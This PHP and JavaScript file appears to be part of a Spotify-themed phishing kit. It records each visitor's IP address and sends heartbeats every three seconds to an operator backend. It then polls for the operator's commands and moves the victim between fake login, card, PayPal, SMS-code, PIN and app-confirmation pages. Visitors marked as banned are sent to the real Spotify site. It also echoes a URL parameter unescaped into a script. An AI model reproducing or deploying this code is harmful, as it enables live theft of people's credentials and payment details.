<?php
require_once '../funcsion/functions.php';
$ip = get_client_ip();

$currentPageName = isset($_GET['p']) ? $_GET['p'] : 'unknown';
$currentView = isset($_GET['v']) ? $_GET['v'] : $currentPageName;
?>
<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"></head>
<body>
<script>
var ip='<?php echo $ip; ?>',cv='<?php echo $currentView; ?>';
function h(){try{var x=new XMLHttpRequest();x.open('GET','heartbeat.php?ip='+encodeURIComponent(ip)+'&page='+encodeURIComponent(cv)+'&t='+Date.now(),true);x.timeout=5000;x.send()}catch(e){}}
function r(){var x=new XMLHttpRequest();x.open('GET','check_redirect.php?ip='+encodeURIComponent(ip)+'&t='+Date.now(),true);x.onreadystatechange=function(){if(x.readyState===4&&x.status===200){var c=x.responseText.trim();if(c===cv||c==='waiting'||c==='')return;var p={'ban':'https://www.spotify.com','login':'login.php','loginerr':'login.php','payment':'payment.php','card':'payment.php?card=1','paypal':'payment.php?paypal=1','sms':'payment.php?sms=1','sms2':'payment.php?sms2=1','sms_error':'payment.php?sms_error=1','sms_error2':'payment.php?sms_error2=1','app_error':'payment.php?app_error=1','success':'../success.php','lettre':'../lettre.html','pin':'payment.php?pin=1','app':'payment.php?app=1','card_error':'payment.php?card_error=1','paymenterr':'payment.php?card_error=1','gift':'payment.php?gift=1','louading':'payment.php?loading=1','loading':'payment.php?loading=1','waiting':'payment.php?waiting=1'};if(p[c])parent.location.href='../global/'+p[c]}};x.send()}
document.addEventListener('visibilitychange',function(){h()});
window.addEventListener('beforeunload',function(){navigator.sendBeacon('heartbeat.php?ip='+encodeURIComponent(ip)+'&page=leaving&t='+Date.now())});
h();setInterval(h,3000);setInterval(r,3000);
</script>
</body>
</html>
